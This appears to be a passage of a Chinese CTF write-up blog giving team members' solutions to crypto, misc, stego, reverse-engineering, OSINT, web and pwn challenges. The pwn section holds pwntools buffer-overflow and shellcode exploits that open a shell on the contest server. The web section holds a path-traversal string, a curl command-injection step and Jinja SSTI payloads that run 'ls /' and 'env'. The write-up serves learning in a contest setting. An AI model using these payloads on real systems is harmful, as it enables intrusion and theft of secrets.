+<p>椭圆曲线的入门题，与攻防世界的easy ECC相比，缺少了a,b两个参数。但是，有三个已知点，我们可以通过椭圆曲线的方程解出这两个未知数。</p>
+<img src="https://img.junyu33.me/blog/ctf04/crypto7.png">
+<p>注意这两个值要在模p的情况下有意义，我们可以用gmpy2.invert函数求出对应的值。</p>
+<p>最后根据快速幂，我们可以写出以下代码：</p>
+<pre><code class="language-python">from gmpy2 import *
+from Crypto.Util.number import *
+
+zero = (0,0)
+
+a = 82434704921831126317349084148380426791883173943813663537990423892369888514044
+b = 311475221040936280208362290787407966613
+n = 82434704921831126317349084148380426792000286866075383521515099269291038312183
+p = 82434704921831126317349084148380426791883173943813663537990423892369888514061
+G = (81403639825184272992871756462679165959131935479082301407409473940853140527035 , 111858327599117205208040416341606595974639126132558018462114484339055815343)
+
+ 
+def add(p1, p2):
+  if p1 == zero:
+     return p2
+  if p2 == zero:
+     return p1
+  (p1x,p1y),(p2x,p2y) = p1,p2
+  if p1x == p2x and (p1y != p2y or p1y == 0):
+     return zero
+  if p1x == p2x:
+     lam = (3 * p1x * p1x + a) * invert(2 * p1y , p) % p
+  else:
+     lam = (p2y - p1y) * invert(p2x - p1x , p) % p
+  x = (lam**2 - p1x - p2x) % p
+  y = (lam * (p1x - x) - p1y) % p
+  return (int(x),int(y))
+def point_neg(point):
+  x, y = point
+  res = (x, -y % p)
+  return res
+def fast_mul(k, point):
+  '''
+  a trick!
+  '''
+  if k &lt; 0:
+     return fast_mul(-k, point_neg(point))
+  res = zero
+  addend = point
+  while k:
+     if k &amp; 1:
+       res = add(res, addend)
+     addend = add(addend, addend)
+     k &gt;&gt;= 1
+  return res
+  
+k = 73844933862216652622492520515324611426018473790347046447404478062546746765750
+
+C1 = (20058089234486140225873266550951624285964438180038043783132571119098797258964 , 44425976028240060721292567543561982553652201677216540575424866418518533833686 )
+
+C2 = (44219316884405871793950087163675141641324021196457542671365362829884688420072 , 42705405459815954011526630723538719826904473252385988608867562886364716986612 )
+
+nC2 = fast_mul(k, C2)
+m = add(C1,point_neg(nC2))
+print(m)
+print(hex(m[0] + m[1])[2:])
+</code></pre>
+<h2 id="Crypto-8-Vigenere">Crypto-8:Vigenere</h2>
+<p><a target="_blank" rel="noopener" href="https://quipquip.com">quipquip.com</a></p>
+<p>这种大段的文字，进行词频分析很容易解决。</p>
+<img src="https://img.junyu33.me/blog/ctf04/crypto8.png">
+<h2 id="Misc-1-test-your-nc">Misc-1:test_your_nc~~~</h2>
+<p>图片的尺寸太大，kali的终端有缩小文字的功能。</p>
+<h2 id="Misc-2-OldKinderhoek">Misc-2:OldKinderhoek</h2>
+<p>文件名叫Ook.txt，上网查询Ook编码，发现只有3种编码方式（恰好文本也只有0、1、4三个数），写个脚本排列组合一下，排版处理好，就可以拿到网站去解密了。</p>
+<p><a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></p>
+<h2 id="Misc-3-test-your-nc">Misc-3:test_your_nc~~~~~~~~~</h2>
+<p>作画比赛，通过可见字符填充像素，输入cat /f*命令即可。</p>
+<p>（orc识别精度真的低，有时候同一个字符画有时能识别，有时不能识别）</p>
+<h2 id="Misc-4-Time-To-Leave">Misc-4:Time To Leave</h2>
+<p>流量题，将ttl字段添加到列上。按照时间顺序，只看ttl所对应的字节码，就可以看到每隔几个字符出现的flag。</p>
+<h2 id="Misc-5-Fire-in-the-hole">Misc-5:Fire in the hole</h2>
+<p>010-editor打开压缩文件</p>
+<img src="https://img.junyu33.me/blog/ctf04/misc5_1.png">
+<p>根据提示（文件夹也是一种文件），我们文件夹的形式改成文件的形式：</p>
+<img src="https://img.junyu33.me/blog/ctf04/misc5.png">
+<p>把第一排的flag/改成flag即可</p>
+<p>scuctf{d1r_0r_fffffil3?}</p>
+<h2 id="Misc-6-Puny先辈的咆哮">Misc-6:Puny先辈的咆哮</h2>
+<p>题目提示很明显，先用punycode解码，然后会得到一串不可描述的文字。复制一段文字在网上搜就可以搜到解码这段文字的网站。</p>
+<p><a target="_blank" rel="noopener" href="https://roar.iiilab.com/">https://roar.iiilab.com/</a></p>
+<h2 id="Stego-1-EZ-Steg">Stego-1:EZ_Steg</h2>
+<p>Stegsolve打开，左右翻几下，二维码就出来了，扫一下就是flag。</p>
+<h2 id="Stego-2-Baby-Steg">Stego-2:Baby_Steg</h2>
+<p>那个提示就很劝退，看不懂，“秘密信息比特”机翻味儿十足。</p>
+<p>Stegsolve在调整到random color map的时候，细心的同学会发现左上角有串不规则的像素点，类似于这样：</p>
+<img src="https://img.junyu33.me/blog/ctf04/stego2.png">
+<p>把像素点进行01编码，转成ascii，就可以得到flag。虽然中间有颜色的那段看不清楚，但是flag是有意义的，可以猜得到（我一次就猜中了）。</p>
+<h2 id="Web-vscodeServer">Web:vscodeServer</h2>
+<p>既然是简单题，而且界面那么现代，那么肯定不涉及注入之类的漏洞。</p>
+<p>直接一输弱口令，就进去了，还是个root。</p>
+<p>找到终端，ls，cat flag，完工。</p>
+<h2 id="Web-6-include">Web-6:include</h2>
+<p>最最最基础的文件包含，连我这个不碰web的人都写出来了。</p>
+<p>?file=../../../flag</p>
+<p>scuctf{1nclude_Y0u_g0t_1t}</p>
+<h2 id="Java-命令执行">Java:命令执行</h2>
+<p>出题人撤回的手速不够快，还是被我下载到了。</p>
+<img src="https://img.junyu33.me/blog/ctf04/java.jpg">
+<h2 id="Osint-3-寂寞的夜">Osint-3:寂寞的夜</h2>
+<p>可以从图片看到有一家店叫“速8超市”，使用百度地图，可以找到为数不多的的几个地方，其中一个位于北京的街景图跟这张比较像，就成了。</p>
+<h2 id="Pwn-1-test-your-nc">Pwn-1:test_your_nc</h2>
+<p>同buuctf pwn第一题，直接nc连接，cat flag即可。</p>
+<h2 id="Pwn-2-quiz">Pwn-2:quiz</h2>
+<p>前面三道题你会C语言就会做。</p>
+<p>汇编基础还是得学的，毕竟代码放到asm文件并不能直接运行，甚至还没你肉眼观察来得快。</p>
+<p>学习链接：<a target="_blank" rel="noopener" href="https://www.icourse163.org/course/ZZU-1001796025">https://www.icourse163.org/course/ZZU-1001796025</a></p>
+<h2 id="Pwn-3-stackoverflow">Pwn-3:stackoverflow</h2>
+<p>pwn最简单的类型，只需要找到bufferlength和后门地址就可以了。</p>
+<p>Vuln_echo函数中buf的长度为0x30，因为是64位，加上rbp的长度8，就是填充的长度。</p>
+<p>返回地址就是backdoor函数中system(“bin/sh”)函数的地址。</p>
+<pre><code class="language-python">from pwn import *
+#io = process('/ret2text')
+io = connect('game.scuctf.com', 20006)
+payload = b'a'*0x38 + p64(0x4012D7)
+io.sendline(payload)
+io.interactive()
+</code></pre>
+<h2 id="Pwn-4-ret2shellcode">Pwn-4:ret2shellcode</h2>
+<p>64位程序，elf文件</p>
+<p>可以使用不断io.recvline()来读取每一行的信息，再进行切片就可以截取到输入地址。</p>
+<p>从某些方面来说，输入地址与泄露地址之间存在一定的偏移（可以通过动态调试查看rsi的地址与题目给出的地址差来确定），但本题偏移为0.</p>
+<p>Payload=shellcode.ljust(k,’a’)+p64(buf)</p>
+<p>k=bias+bufferlength+sizeof(ebp)</p>
+<p>因此填充k的数量为0x88</p>
+<pre><code class="language-python">from pwn import *
+context(arch = 'amd64',os = 'linux')#不加这行会出现sigill错误
+#p = process('./ret2shellcode')
+p = remote('game.scuctf.com',20004)
+loc = p.recvline()
+loc = p.recvline()
+loc = p.recvline()
+loc = p.recvline()
+loc = p.recvline()
+loc = p.recvline()
+buf = int(loc[-15:-1],16)
+shellcode = asm(shellcraft.sh())
+payload = shellcode.ljust(0x88, b'a') + p64(buf)
+p.sendline(payload)
+p.interactive()
+</code></pre>
+<p>（Re最简单的题和最难的题都被队员抢了qwq）</p>
+<h2 id="Re5-ezapk">Re5:ezapk</h2>
+<p>（一点也不easy，光看jeb还不能解决问题。）</p>
+<p>Mainactivity中有一个private成员，名曰check函数，在代码段中没有定义。</p>
+<p>根据以往做题的经验，我马上用ida加载apk的库文件，找到了check函数。</p>
+<p>（这代码看着真头疼，尤其是那个return）</p>
+<img src="https://img.junyu33.me/blog/ctf04/re5.png">
+<p>个人猜测源码的含义是将输入的前半放到奇数位，后半放到偶数位，并将每一项与它的位置异或，与内部的密文进行对比。</p>
+<p>我编写了解密脚本，但是flag部分字符出了点锅。于是我就只将每一位异或，肉眼观察出答案了。</p>
+<h2 id="HappyRe-ezJava">HappyRe:ezJava</h2>
+<p>（确实很happy）</p>
+<p>Jeb4.2打开，反编译一下，往下翻直接看到flag。</p>
+<img src="https://img.junyu33.me/blog/ctf04/happyre.png">
+<h2 id="Re4-Upxed">Re4:Upxed</h2>
+<p>虽然出题人希望我们手动脱壳，但是upx脱壳的结果也具有可读性，还是挺不错的。</p>
+<p>提示说这是tea加密，这里有一个手写的C代码：</p>
+<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-266933.htm">https://bbs.pediy.com/thread-266933.htm</a></p>
+<p>我们查看反汇编：</p>
+<img src="https://img.junyu33.me/blog/ctf04/re4.png">
+<p>密文就是那个v6数组，key就是THIS_IS_THE_KEYa，注意转换成int的时候要使用小端序。</p>
+<p>然后还要注意加密循环次数（32次），一个magic number（-0x61C88647，注意，是“负数“，这点比较坑）。其余的照葫芦画瓢即可。</p>
+<h2 id="Re9-Plants-Vs-Zombies（非预期解）">Re9:Plants_Vs_Zombies（非预期解）</h2>
+<p><strong>（正解是与“天堂之门”有关的技术，当然我现在肯定不会。）</strong></p>
+<p>拿到游戏我先使用一些奇技淫巧，在半个小时以内的时间通关了（不要问我如何快速通关的），然而期望中的解密程序并没有出现。</p>
+<p>然后在游戏失败时，根目录里面的flag.txt会被加密成flag.enc。我由于前面两道题都做了密码学，crypto杀疯了，我便尝试去寻找明文与密文的关系。</p>
+<img src="https://img.junyu33.me/blog/ctf04/re9.png">
+<p>由图可知，明文和密文是按位加密，而且两者之间的换算有很明显的线性关系，只是加了数组中的地址，解密时只需在程序中减去地址即可。</p>
+<p>（其中第七个字节有点特别，但是我们知道它肯定是“{“，因此我们暂且不去管它）</p>
+<p>现在我们来确定k，b与mod这几个参数。</p>
+<p>算k很容易，做差就可以，答案是0x20</p>
+<p>算b的时候出了一点小锅，当我把ascii码为0的字符输进去时，程序会崩溃，经过与出题人的交流后得知是技术导致的锅。于是我把ascii为1输进去，得到结果0x20，因此b=0.</p>
+<p>至于算mod,见下图：</p>
+<img src="https://img.junyu33.me/blog/ctf04/re9_2.png">
+<p>很明显mod&lt;=256，而且出现了“FB“这个字符，因此mod&gt;251，因此mod只有255这个唯一值。</p>
+<p>做到这里程序的加密函数已经被我完全理清了，接下来有两个办法：</p>
+<ol>
+<li>
+<p>写解密函数。</p>
+</li>
+<li>
+<p>直接将原文和密文映射，用数组保存。</p>
+</li>
+</ol>
+<p>我选择了后者，因为32与255互质，因此理论上能够一一映射，但是在实战中还是出现了一些问题——打印出的flag有些字符无法显示。</p>
+<img src="https://img.junyu33.me/blog/ctf04/re9_1.png">
+<p>那两个空的地方，左边应该是一个下划线，右边我尝试了一下fate，gate这两个单词，结果就出来了。</p>
+<p>参考代码：</p>
+<pre><code class="language-c">#include&lt;stdio.h&gt;
+#include&lt;string.h&gt;
+int enc[]=&#123;
+0x6E, 0x6D, 0xB0, 0x6F, 0x92, 0xD1, 0x11, 0x74, 0xD5, 0xF6, 0x76, 0x78, 0x39, 0xDA, 0xF9, 0xFC,
+0xDD, 0xFC, 0x1F, 0xBF, 0x40, 0xE3, 0xC2, 0xE4, 0x86, 0x04, 0x06, 0x47, 0xAA, 0xC9, 0xCD,
+&#125;;
+int encr(int x,int pos)&#123;
+	int k=0x20;
+	int mod=255;
+	return (k*x+pos)%mod;
+&#125;
+int inv[300];
+int main()
+&#123;
+	for(int i=1;i&lt;=127;i++)
+		inv[encr(i,0)]=i;
+	for(int i=0;i&lt;32;i++)
+		printf(&quot;%c&quot;,inv[enc[i]-i]);
+	return 0;
+&#125;
+</code></pre>
+<h1>WriteUp from xiran</h1>
+<h2 id="Osint-1：该走哪条路">Osint-1：该走哪条路</h2>
+<p>观察图片：成都中新</p>
+<p>在地图搜索，得到flag</p>
+<h2 id="Osint-2：赶火车">Osint-2：赶火车</h2>
+<p>把图片放入百度识图就找到原图</p>
+<p>查看图片介绍找到flag</p>
+<img src="https://img.junyu33.me/blog/ctf04/osint2.png">
+<h2 id="Osint-4：蓝色星球">Osint-4：蓝色星球</h2>
+<p>在百度筛选卫星图，获得</p>
+<img src="https://img.junyu33.me/blog/ctf04/osint2_1.png">
+<p>一眼看出是意大利</p>
+<img src="https://img.junyu33.me/blog/ctf04/osint2_2.png">
+<p>获得答案</p>
+<h2 id="Osint-5：旅行日记">Osint-5：旅行日记</h2>
+<p>通过告示牌定位到日本大津</p>
+<p>查看大津的JR车站名字，找到和告示牌相像的</p>
+<p>查看指路牌获得方向</p>
+<p>利用谷歌地图获得答案</p>
+<h2 id="RE1-Welcome">RE1:Welcome</h2>
+<p>IDA载入，获得一串数字</p>
+<p>输入到程序得到FLAG</p>
+<h2 id="RE2-Xor">RE2:Xor</h2>
+<p>IDA载入，得到是简单异或</p>
+<p>查看内存，反异或得到答案</p>
+<h2 id="RE3-DebugMe">RE3:DebugMe</h2>
+<p>IDA远程调试</p>
+<p>找到程序的正确终点，通过调整寄存器让程序跑到正确位置，拿到flag</p>
+<h2 id="RE6-EzLinearEquation">RE6:EzLinearEquation</h2>
+<p>IDA载入，得到多元1次方程，调用python的z3库解方程即可</p>
+<p><a target="_blank" rel="noopener" href="https://netcut.cn/1fl6ahg7f">Re6.cpp</a>（一周内有效）</p>
+<h2 id="RE7-VirtualMachine">RE7:VirtualMachine</h2>
+<p>x32dbg载入</p>
+<p>输入函数</p>
+<img src="https://img.junyu33.me/blog/ctf04/re7.png">
+<p>比较函数</p>
+<img src="https://img.junyu33.me/blog/ctf04/re7_1.png">
+<p>比较函数首先比较字符串长度</p>
+<p>然后对加密后的输入和密文比较</p>
+<p>通过实验发现是单个字符依次加密</p>
+<p>爆破flag进行验证即可</p>
+<h2 id="HardRe-Fxxk">HardRe:Fxxk</h2>
+<p>Od载入</p>
+<p>单步执行到主函数</p>
+<img src="https://img.junyu33.me/blog/ctf04/re8.png">
+<p>输入函数</p>
+<img src="https://img.junyu33.me/blog/ctf04/re8_1.png">
+<p>得知字符串的长度为8</p>
+<img src="https://img.junyu33.me/blog/ctf04/re8_2.png">
+<p>验证字符串的长度是否为8</p>
+<img src="https://img.junyu33.me/blog/ctf04/re8_3.png">
+<p>对每一个字符通过这个函数验证</p>
+<p>进入这个函数</p>
+<img src="https://img.junyu33.me/blog/ctf04/re8_4.png">
+<p>分析此函数得 验证输入是否在A-Z范围内</p>
+<p>顺便加密输入</p>
+<p>观察寄存器得到加密后的输入</p>
+<img src="https://img.junyu33.me/blog/ctf04/re8_5.png">
+<p>继续执行，发现一个字符串</p>
+<img src="https://img.junyu33.me/blog/ctf04/re8_6.png">
+<p>继续执行代码，发现是把加密后的输入挨个与 “LMSULHNH“比较</p>
+<p>方法1：爆破flag</p>
+<p>方法2：根据汇编的加密函数反推flag</p>
+<h1>WriteUp from Cyan</h1>
+<h2 id="Web1-Get-Post">[Web1] Get&amp;Post</h2>
+<img src="https://img.junyu33.me/blog/ctf04/web1.png">
+<p>Post flag=flagggg</p>
+<p>Get a=flag</p>
+<h2 id="Web2-Hardphp">[Web2] Hardphp</h2>
+<p>纪律性检查robots.txt后访问indexxxxx.php</p>
+<p>找到源码</p>
+<img src="https://img.junyu33.me/blog/ctf04/web2.png"> 
+<p>构造0e开头且md5值0e开头的字符串0e215962017</p>
+<img src="https://img.junyu33.me/blog/ctf04/web2_1.png"> 
+<h2 id="Web5-抽象的代码艺术">[Web5]抽象的代码艺术</h2>
+<p>将源码url编码后</p>
+<img src="https://img.junyu33.me/blog/ctf04/web5.png"> 
+<p>发现多了</p>
+<blockquote>
+<p>%80%AE%E2%81%A6  %80%AE%E2%80%A6</p>
+</blockquote>
+<p>这两种不可见字符，构造</p>
+<blockquote>
+<p>%E2%80%AE%E2%81%A6scuctf%E2%80%AE…666=scuctf</p>
+</blockquote>
+<img src="https://img.junyu33.me/blog/ctf04/web5_1.png"> 
+<h2 id="Web7-curl-curl-curl">[Web7] curl_curl_curl</h2>
+<p>由题目易得存在curl的漏洞</p>
+<p>测试一下</p>
+<img src="https://img.junyu33.me/blog/ctf04/web7.png">
+<p>发现ls命令被执行了</p>
+<p>然后就是简单的翻找目录然后双写绕过cat flag</p>
+<img src="https://img.junyu33.me/blog/ctf04/web7_1.png"> 
+<h2 id="Web-ezSSTI">[Web]ezSSTI</h2>
+<p>由题目易得存在sstl标准注入的漏洞</p>
+<p>测试一下</p>
+<img src="https://img.junyu33.me/blog/ctf04/ssti.png">
+<p>发现命令被执行</p>
+<p>获取所有类</p>
+<pre><code>?name=&#123;&#123;%27%27.__class__.__mro__[2].__subclasses__()&#125;&#125;
+</code></pre>
+<img src="https://img.junyu33.me/blog/ctf04/ssti_1.png"> 
+<p>寻找&lt;class ‘warnings.catch_warnings’&gt;为第59位</p>
+<p>构造执行命令的payload</p>
+<pre><code>?name=&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__.__globals__[%27__builtins__%27][%27__imp%27+%27ort__%27](%27os%27).__dict__[%27pop%27+%27en%27](%27ls%20/%27).read()&#125;&#125;
+</code></pre>
+<img src="https://img.junyu33.me/blog/ctf04/ssti_2.png"> 
+<p>被执行但没发现flag文件</p>
+<p>在提示下查看环境变量</p>
+<pre><code>?name=&#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__.__globals__[%27__builtins__%27][%27__imp%27+%27ort__%27](%27os%27).__dict__[%27pop%27+%27en%27](%27env%27).read()&#125;&#125;
+</code></pre>
+<img src="https://img.junyu33.me/blog/ctf04/ssti_3.png"> 
+
+</div>
+
+
+  </div>
+</body>
+</html>
+
